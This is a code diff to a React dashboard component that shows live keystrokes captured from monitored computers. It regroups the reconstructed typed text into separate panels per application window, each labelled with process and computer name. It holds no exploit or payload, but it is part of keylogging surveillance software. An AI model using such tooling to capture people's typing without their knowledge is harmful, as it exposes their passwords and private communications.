@@ -20,6 +20,8 @@ import {
   Maximize2,
   Radio,
   Wifi,
+  X,
+  Layers,
 } from "lucide-react";
 import { format, parseISO, differenceInMilliseconds } from "date-fns";
 
@@ -78,8 +80,11 @@ function KeystrokeReplay() {
   // Live mode state
   const [isLiveMode, setIsLiveMode] = useState(false);
   const [liveEvents, setLiveEvents] = useState([]);
-  const [liveText, setLiveText] = useState("");
   const [isLiveConnected, setIsLiveConnected] = useState(false);
+
+  // Multi-window live text state - each window gets its own panel
+  // Key: "process|window_title", Value: { text, process, window, lastActivity, computerName }
+  const [liveWindows, setLiveWindows] = useState({});
 
   // Refs
   const playbackRef = useRef(null);
@@ -142,8 +147,15 @@ function KeystrokeReplay() {
         if (selectedComputer && event.computer_id !== selectedComputer) return;
 
         const key = event.data?.key || "";
-        setCurrentWindow(event.data?.target_window || "");
-        setCurrentProcess(event.data?.target_process || "");
+        const windowTitle = event.data?.target_window || "Unknown Window";
+        const processName = event.data?.target_process || "unknown";
+        const computerName = event.computer_name || "Unknown";
+
+        // Create a unique key for this window
+        const windowKey = `${processName}|${windowTitle}`;
+
+        setCurrentWindow(windowTitle);
+        setCurrentProcess(processName);
 
         // Add to live events list (for sidebar)
         setLiveEvents((prev) =>
@@ -157,34 +169,55 @@ function KeystrokeReplay() {
           ].slice(0, 100)
         ); // Keep last 100 events, newest first
 
-        // Process the single key to update display in real-time
-        setLiveText((prev) => {
-          let text = prev;
+        // Update the specific window's text
+        setLiveWindows((prev) => {
+          const existing = prev[windowKey] || {
+            text: "",
+            process: processName,
+            window: windowTitle,
+            computerName: computerName,
+            lastActivity: Date.now(),
+          };
+
+          let newText = existing.text;
 
           // Handle special keys
           if (key.startsWith("[")) {
             if (key === "[BACKSPACE]") {
-              text = text.slice(0, -1);
+              newText = newText.slice(0, -1);
             } else if (key === "[CTRL+BACKSPACE]") {
               // Delete previous word
-              while (text.length > 0 && text[text.length - 1] === " ") {
-                text = text.slice(0, -1);
+              while (
+                newText.length > 0 &&
+                newText[newText.length - 1] === " "
+              ) {
+                newText = newText.slice(0, -1);
               }
-              while (text.length > 0 && text[text.length - 1] !== " ") {
-                text = text.slice(0, -1);
+              while (
+                newText.length > 0 &&
+                newText[newText.length - 1] !== " "
+              ) {
+                newText = newText.slice(0, -1);
               }
             } else if (key === "[ENTER]") {
-              text += "\n";
+              newText += "\n";
             } else if (key === "[TAB]") {
-              text += "    ";
+              newText += "    ";
             }
             // Ignore other special keys like [UP], [DOWN], [CTRL+C], etc.
           } else {
             // Regular character
-            text += key;
+            newText += key;
           }
 
-          return text;
+          return {
+            ...prev,
+            [windowKey]: {
+              ...existing,
+              text: newText,
+              lastActivity: Date.now(),
+            },
+          };
         });
       });
 
@@ -221,7 +254,7 @@ function KeystrokeReplay() {
     if (!isLiveMode) {
       // Entering live mode - clear replay data
       setIsPlaying(false);
-      setLiveText("");
+      setLiveWindows({});
       setLiveEvents([]);
       setIsLiveMode(true);
     } else {
@@ -245,16 +278,39 @@ function KeystrokeReplay() {
         socketRef.current.emit("subscribe_live_keystrokes", {});
         console.log("Subscribed to live keystrokes from all computers");
       }
-      // Clear previous text when switching computers
-      setLiveText("");
+      // Clear previous windows when switching computers
+      setLiveWindows({});
       setLiveEvents([]);
     }
   }, [selectedComputer, isLiveMode, isLiveConnected]);
 
-  // Clear live text
+  // Clear all live windows
   const clearLiveText = () => {
-    setLiveText("");
+    setLiveWindows({});
     setLiveEvents([]);
+  };
+
+  // Close a specific window panel
+  const closeWindowPanel = (windowKey) => {
+    setLiveWindows((prev) => {
+      const newWindows = { ...prev };
+      delete newWindows[windowKey];
+      return newWindows;
+    });
+  };
+
+  // Get sorted window entries (most recent activity first)
+  const sortedWindowEntries = Object.entries(liveWindows).sort(
+    ([, a], [, b]) => b.lastActivity - a.lastActivity
+  );
+
+  // Calculate grid layout based on number of windows
+  const getGridClass = (count) => {
+    if (count === 1) return "grid-cols-1";
+    if (count === 2) return "grid-cols-2";
+    if (count <= 4) return "grid-cols-2";
+    if (count <= 6) return "grid-cols-3";
+    return "grid-cols-3";
   };
 
   // Load keystroke events
@@ -533,9 +589,18 @@ function KeystrokeReplay() {
               {isLiveMode ? "Live Keystrokes" : "Keystroke Replay"}
             </span>
             {isLiveMode && isLiveConnected && (
-              <span className="flex items-center gap-1 text-xs text-green-400">
-                <span className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
-                Connected
+              <span className="flex items-center gap-2 text-xs text-green-400">
+                <span className="flex items-center gap-1">
+                  <span className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
+                  Connected
+                </span>
+                {sortedWindowEntries.length > 0 && (
+                  <span className="flex items-center gap-1 text-gray-400">
+                    <Layers className="w-3 h-3" />
+                    {sortedWindowEntries.length} window
+                    {sortedWindowEntries.length !== 1 ? "s" : ""}
+                  </span>
+                )}
               </span>
             )}
           </div>
@@ -617,12 +682,13 @@ function KeystrokeReplay() {
           )}
 
           {/* Clear button for live mode */}
-          {isLiveMode && (
+          {isLiveMode && sortedWindowEntries.length > 0 && (
             <button
               onClick={clearLiveText}
-              className="px-3 py-1.5 bg-[#21262d] text-gray-400 border border-[#30363d] rounded-lg font-medium text-sm transition-all hover:text-red-400 hover:border-red-500/30"
+              className="px-3 py-1.5 bg-[#21262d] text-gray-400 border border-[#30363d] rounded-lg font-medium text-sm transition-all hover:text-red-400 hover:border-red-500/30 flex items-center gap-2"
             >
-              Clear
+              <X className="w-3 h-3" />
+              Clear All
             </button>
           )}
         </div>
@@ -653,34 +719,110 @@ function KeystrokeReplay() {
             </div>
 
             {/* Text Display Area */}
-            <div
-              ref={displayRef}
-              className="flex-1 p-6 font-mono text-lg text-gray-200 overflow-auto bg-[#0d1117] leading-relaxed"
-            >
+            <div ref={displayRef} className="flex-1 overflow-auto bg-[#0d1117]">
               {isLiveMode ? (
-                // Live mode display
-                liveText || liveEvents.length > 0 ? (
-                  <div className="whitespace-pre-wrap">
-                    {liveText}
-                    <span
-                      className={`inline-block w-[2px] h-[1.2em] bg-green-400 ml-[1px] align-middle transition-opacity ${
-                        cursorVisible ? "opacity-100" : "opacity-0"
-                      }`}
-                    />
+                // Live mode display - multiple window panels
+                sortedWindowEntries.length > 0 ? (
+                  <div
+                    className={`grid ${getGridClass(
+                      sortedWindowEntries.length
+                    )} gap-3 p-4 h-full`}
+                  >
+                    {sortedWindowEntries.map(
+                      ([windowKey, windowData], index) => {
+                        const WindowIcon = getProcessIcon(windowData.process);
+                        const isActive = index === 0; // Most recent is active
+
+                        return (
+                          <div
+                            key={windowKey}
+                            className={`flex flex-col rounded-lg border overflow-hidden transition-all ${
+                              isActive
+                                ? "border-green-500/50 bg-[#161b22] ring-1 ring-green-500/30"
+                                : "border-[#30363d] bg-[#161b22]/50"
+                            }`}
+                          >
+                            {/* Window Title Bar */}
+                            <div
+                              className={`flex items-center gap-2 px-3 py-2 border-b ${
+                                isActive
+                                  ? "border-green-500/30 bg-green-500/10"
+                                  : "border-[#30363d] bg-[#21262d]"
+                              }`}
+                            >
+                              <div className="flex gap-1.5">
+                                <button
+                                  onClick={() => closeWindowPanel(windowKey)}
+                                  className="w-3 h-3 rounded-full bg-red-500 hover:bg-red-400 transition-colors"
+                                  title="Close panel"
+                                />
+                                <div className="w-3 h-3 rounded-full bg-yellow-500" />
+                                <div className="w-3 h-3 rounded-full bg-green-500" />
+                              </div>
+                              <WindowIcon
+                                className={`w-4 h-4 ml-2 ${
+                                  isActive ? "text-green-400" : "text-gray-400"
+                                }`}
+                              />
+                              <span
+                                className={`text-xs truncate flex-1 ${
+                                  isActive ? "text-green-300" : "text-gray-400"
+                                }`}
+                              >
+                                {windowData.window}
+                              </span>
+                              {isActive && (
+                                <span className="flex items-center gap-1 text-xs text-green-400">
+                                  <span className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
+                                  Active
+                                </span>
+                              )}
+                            </div>
+
+                            {/* Window Content */}
+                            <div className="flex-1 p-3 font-mono text-sm text-gray-200 overflow-auto min-h-[100px] max-h-[300px]">
+                              <div className="whitespace-pre-wrap break-words">
+                                {windowData.text}
+                                {isActive && (
+                                  <span
+                                    className={`inline-block w-[2px] h-[1em] bg-green-400 ml-[1px] align-middle transition-opacity ${
+                                      cursorVisible
+                                        ? "opacity-100"
+                                        : "opacity-0"
+                                    }`}
+                                  />
+                                )}
+                              </div>
+                            </div>
+
+                            {/* Window Footer */}
+                            <div className="px-3 py-1.5 border-t border-[#30363d] bg-[#0d1117]/50">
+                              <div className="flex items-center justify-between text-xs text-gray-500">
+                                <span>{windowData.process}</span>
+                                <span>{windowData.computerName}</span>
+                              </div>
+                            </div>
+                          </div>
+                        );
+                      }
+                    )}
                   </div>
                 ) : (
-                  <div className="flex flex-col items-center justify-center h-full text-gray-500">
+                  <div className="flex flex-col items-center justify-center h-full text-gray-500 p-6">
                     <Radio className="w-16 h-16 mb-4 opacity-30 animate-pulse" />
                     <p className="text-lg text-green-400">Live Mode Active</p>
                     <p className="text-sm mt-1">Waiting for keystrokes...</p>
                     <p className="text-xs mt-3 text-gray-600">
                       Type something on a monitored device to see it here
                     </p>
+                    <p className="text-xs mt-1 text-gray-600">
+                      Each window will appear as a separate panel
+                    </p>
                   </div>
                 )
               ) : // Replay mode display
               timelineEvents.length > 0 ? (
-                <div className="whitespace-pre-wrap">
+                <div className="p-6 font-mono text-lg text-gray-200 leading-relaxed whitespace-pre-wrap">
                   {displayText}
                   <span
                     className={`inline-block w-[2px] h-[1.2em] bg-orange-400 ml-[1px] align-middle transition-opacity ${
@@ -689,7 +831,7 @@ function KeystrokeReplay() {
                   />
                 </div>
               ) : (
-                <div className="flex flex-col items-center justify-center h-full text-gray-500">
+                <div className="flex flex-col items-center justify-center h-full text-gray-500 p-6">
                   <Keyboard className="w-16 h-16 mb-4 opacity-30" />
                   <p className="text-lg">No replay loaded</p>
                   <p className="text-sm mt-1">
